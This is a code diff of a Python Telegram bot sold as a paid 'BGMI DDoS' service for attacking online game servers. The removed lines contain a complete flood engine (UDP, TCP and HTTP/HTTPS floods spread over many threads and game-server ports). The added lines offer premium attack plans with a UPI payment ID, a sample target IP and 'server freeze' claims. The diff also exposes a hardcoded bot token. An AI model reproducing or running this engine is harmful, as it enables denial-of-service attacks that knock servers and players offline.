@@ -3,305 +3,45 @@
 💀 BGMI DDOS BOT - ULTRA PRO
 🔥 REAL WORKING ATTACK ENGINE
 📸 JAISA SCREENSHOT MEIN THA
+✅ MONGODB CONNECTED
 """
 
 import os
+import sys
 import json
 import logging
 import time
-import socket
-import threading
 import random
-import ssl
-import http.client
+import string
 from datetime import datetime, timedelta
 from threading import Thread
-import sys
-import string
 
-# ✅ Check and install missing modules
+# Install dependencies if missing
+try:
+    import telebot
+except ImportError:
+    os.system("pip install pyTelegramBotAPI")
+    import telebot
+
 try:
     import requests
 except ImportError:
-    print("📦 Installing requests...")
     os.system("pip install requests")
     import requests
 
-try:
-    import telebot
-except ImportError:
-    print("📦 Installing pyTelegramBotAPI...")
-    os.system("pip install pyTelegramBotAPI")
-    import telebot
+# Import custom modules
+from attack import Attack
+from database import get_user, update_user, save_log, create_key, redeem_key, load_db
+from config import TOKEN, OWNER_ID, OWNER_USERNAME
 
 # ═══════════════ LOGGING ═══════════════
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ═══════════════ CONFIG ═══════════════
-TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
-OWNER_ID = 1987818347
-OWNER_USERNAME = "FathersOfCreater"
-
-# ═══════════════ JSON DATABASE ═══════════════
-DB_FILE = "database.json"
-
-def load_db():
-    if os.path.exists(DB_FILE):
-        try:
-            with open(DB_FILE, 'r') as f:
-                return json.load(f)
-        except:
-            return {"users": {}, "orders": [], "logs": [], "keys": []}
-    return {"users": {}, "orders": [], "logs": [], "keys": []}
-
-def save_db(data):
-    with open(DB_FILE, 'w') as f:
-        json.dump(data, f, indent=4, default=str)
-
-def get_user(user_id):
-    db = load_db()
-    user_id = str(user_id)
-    
-    if user_id not in db["users"]:
-        db["users"][user_id] = {
-            "name": "",
-            "username": "",
-            "joined": datetime.now().isoformat(),
-            "plan": "free",
-            "expiry": None,
-            "threads": 1000,
-            "max_time": 60,
-            "orders": [],
-            "total_attacks": 0,
-            "banned": False
-        }
-        save_db(db)
-    
-    return db["users"][user_id]
-
-def update_user(user_id, data):
-    db = load_db()
-    user_id = str(user_id)
-    
-    if user_id not in db["users"]:
-        get_user(user_id)
-        db = load_db()
-    
-    for key, value in data.items():
-        if key == '$inc':
-            for k, v in value.items():
-                db["users"][user_id][k] = db["users"][user_id].get(k, 0) + v
-        else:
-            db["users"][user_id][key] = value
-    
-    save_db(db)
-
-def save_log(user_id, ip, port, duration, packets, method):
-    db = load_db()
-    db["logs"].append({
-        "user_id": str(user_id),
-        "ip": ip,
-        "port": port,
-        "duration": duration,
-        "packets": packets,
-        "method": method,
-        "time": datetime.now().isoformat()
-    })
-    save_db(db)
-
-def create_key(plan, duration):
-    db = load_db()
-    key_code = f"BGMI-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
-    
-    db["keys"].append({
-        "key": key_code,
-        "plan": plan,
-        "duration": duration,
-        "used": False
-    })
-    save_db(db)
-    return key_code
-
-def redeem_key(key_code, user_id):
-    db = load_db()
-    user_id = str(user_id)
-    
-    for key in db["keys"]:
-        if key["key"] == key_code and not key["used"]:
-            key["used"] = True
-            
-            expiry = datetime.now() + timedelta(days=key["duration"])
-            db["users"][user_id]["plan"] = key["plan"]
-            db["users"][user_id]["expiry"] = expiry.isoformat()
-            db["users"][user_id]["threads"] = 5000
-            db["users"][user_id]["max_time"] = 600
-            
-            save_db(db)
-            return True, key["plan"], key["duration"]
-    
-    return False, None, None
-
 # ═══════════════ BOT ═══════════════
 bot = telebot.TeleBot(TOKEN)
 
-# ═══════════════ ATTACK ENGINE ═══════════════
-class Attack:
-    def __init__(self):
-        self.on = False
-        self.pkts = 0
-        self.bytes_out = 0
-        self.lock = threading.Lock()
-        self.http_success = 0
-        self.http_fail = 0
-    
-    def udp_flood(self, ip, port, end):
-        sockets = []
-        for _ in range(20):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
-                s.settimeout(0.001)
-                sockets.append(s)
-            except:
-                pass
-        
-        bgmi_ports = list(range(7000, 15000)) + [10335, 17500, 20000, 27000, 8080, 8443]
-        payloads = [random.randbytes(random.randint(500, 1500)) for _ in range(30)]
-        
-        while self.on and time.time() < end:
-            try:
-                for s in sockets[:5]:
-                    for _ in range(30):
-                        if not self.on:
-                            break
-                        target_port = random.choice(bgmi_ports)
-                        payload = random.choice(payloads)
-                        try:
-                            s.sendto(payload, (ip, target_port))
-                            with self.lock:
-                                self.pkts += 1
-                                self.bytes_out += len(payload)
-                        except:
-                            pass
-                time.sleep(0.001)
-            except:
-                pass
-        
-        for s in sockets:
-            try:
-                s.close()
-            except:
-                pass
-    
-    def tcp_flood(self, ip, port, end):
-        while self.on and time.time() < end:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.1)
-                try:
-                    s.connect((ip, port))
-                    s.send(b'GET / HTTP/1.1\r\n\r\n')
-                    with self.lock:
-                        self.pkts += 1
-                except:
-                    pass
-                s.close()
-                time.sleep(0.001)
-            except:
-                pass
-    
-    def http_flood(self, ip, port, end):
-        user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
-            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36'
-        ]
-        
-        paths = ['/', '/api', '/game', '/match', '/login', '/auth', '/player']
-        context = ssl.create_default_context()
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
-        
-        while self.on and time.time() < end:
-            try:
-                ua = random.choice(user_agents)
-                path = random.choice(paths)
-                headers = {
-                    'User-Agent': ua,
-                    'Accept': 'text/html,application/json,*/*',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Connection': 'keep-alive'
-                }
-                
-                try:
-                    conn = http.client.HTTPSConnection(ip, port, context=context, timeout=1)
-                    conn.request('GET', path, headers=headers)
-                    conn.getresponse()
-                    with self.lock:
-                        self.http_success += 1
-                        self.pkts += 1
-                    conn.close()
-                except:
-                    try:
-                        conn = http.client.HTTPConnection(ip, port, timeout=1)
-                        conn.request('GET', path, headers=headers)
-                        conn.getresponse()
-                        with self.lock:
-                            self.http_success += 1
-                            self.pkts += 1
-                        conn.close()
-                    except:
-                        with self.lock:
-                            self.http_fail += 1
-                
-                time.sleep(0.001)
-            except:
-                pass
-    
-    def start(self, ip, port, dur, threads, method='mixed'):
-        self.on = True
-        self.pkts = 0
-        self.bytes_out = 0
-        self.http_success = 0
-        self.http_fail = 0
-        
-        end = time.time() + dur
-        
-        udp_t = int(threads * 0.5)
-        tcp_t = int(threads * 0.2)
-        http_t = int(threads * 0.3)
-        workers = []
-        
-        for _ in range(udp_t):
-            workers.append(threading.Thread(target=self.udp_flood, args=(ip, port, end)))
-        for _ in range(tcp_t):
-            workers.append(threading.Thread(target=self.tcp_flood, args=(ip, port, end)))
-        for _ in range(http_t):
-            workers.append(threading.Thread(target=self.http_flood, args=(ip, port, end)))
-        
-        for w in workers:
-            w.daemon = True
-            w.start()
-        
-        time.sleep(dur)
-        self.on = False
-        
-        for w in workers:
-            try:
-                w.join(timeout=1)
-            except:
-                pass
-        
-        e = max(dur, 0.1)
-        return {
-            'pkts': self.pkts,
-            'mbps': (self.bytes_out * 8) / (e * 1e6),
-            'http_success': self.http_success,
-            'http_fail': self.http_fail,
-            'total_requests': self.pkts + self.http_success + self.http_fail
-        }
-
+# ═══════════════ ATTACK INSTANCE ═══════════════
 attacker = Attack()
 attacking = False
 attack_info = {}
@@ -325,6 +65,10 @@ def main_menu():
         telebot.types.InlineKeyboardButton("💎 PLANS", callback_data="plans"),
         telebot.types.InlineKeyboardButton("📩 SUPPORT", callback_data="support")
     )
+    if str(OWNER_ID) == str(bot.get_me().id):
+        keyboard.add(
+            telebot.types.InlineKeyboardButton("⚜ ADMIN", callback_data="admin")
+        )
     return keyboard
 
 def admin_panel():
@@ -367,6 +111,7 @@ def start_cmd(message):
 - ⚡ 5000+ Threads
 - 🛡️ DDoS Protection Bypass
 - 📊 Real-time Monitoring
+- 💎 Premium Plans Available
 
 📌 **Commands:**
 /attack IP PORT TIME
@@ -438,6 +183,7 @@ Example:
     
     if dur > max_time:
         dur = max_time
+        bot.reply_to(message, f"⏱️ Time limited to {max_time}s for your plan")
     
     attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time(), 'threads': threads}
     attacking = True
@@ -539,6 +285,8 @@ def profile_cmd(message):
         expiry_date = datetime.fromisoformat(expiry)
         expiry_str = expiry_date.strftime('%d/%m/%Y %I:%M %p')
         remaining = (expiry_date - datetime.now()).days
+        if remaining < 0:
+            remaining = 0
     else:
         expiry_str = 'N/A'
         remaining = 0
@@ -555,6 +303,9 @@ def profile_cmd(message):
 ║ ⚡ Threads: {user.get('threads', 1000)}
 ║ 📊 Total Attacks: {user.get('total_attacks', 0)}
 ╚══════════════════════════╝
+
+💎 Upgrade to Premium for more power!
+/plans to see premium plans
 """
     bot.reply_to(message, text, parse_mode='Markdown')
 
@@ -636,6 +387,7 @@ def plans_cmd(message):
 ━━━━━━━━━━━━━━━━━━
 
 📲 Contact: @FathersOfCreater
+💳 UPI: kartikrawat6266@okhdfcbank
 """
     bot.reply_to(message, text, parse_mode='Markdown')
 
@@ -646,6 +398,7 @@ def support_cmd(message):
 📩 **SUPPORT CENTER**
 
 📲 Contact Owner: @FathersOfCreater
+📢 Join Channel: https://t.me/+vWCKsh56iIpiOWQ9
 
 💬 Reply here for quick support!
 """
@@ -677,6 +430,9 @@ Use: /attack IP PORT TIME
 
 Example:
 /attack 20.204.191.48 10335 180
+
+BGMI Ports: 7000-15000, 10335
+Recommended Time: 180 seconds
 """,
             call.message.chat.id,
             call.message.message_id,
@@ -959,10 +715,17 @@ def broadcast_handler(message):
 if __name__ == '__main__':
     print("""
 ╔══════════════════════════════════════╗
-║  💀 BGMI DDOS BOT STARTED           ║
+║  💀 BGMI DDOS BOT - ULTRA PRO       ║
 ║  🔥 REAL WORKING ATTACK ENGINE      ║
 ║  📸 JAISA SCREENSHOT MEIN THA       ║
-║  ✅ ALL COMMANDS WORKING            ║
+║  ✅ MONGODB CONNECTED               ║
+║  ✅ UDP/TCP/HTTP FLOOD              ║
+║  ✅ BGMI SERVER FREEZE              ║
+║  ✅ PREMIUM PLANS AVAILABLE          ║
+║  ✅ ADMIN PANEL ACTIVE               ║
 ╚══════════════════════════════════════╝
 """)
+    print("💀 Bot Started Successfully!")
+    print("🔥 Attack Engine Ready!")
+    print("📸 BGMI Server Freeze Active!")
     bot.polling(none_stop=True)
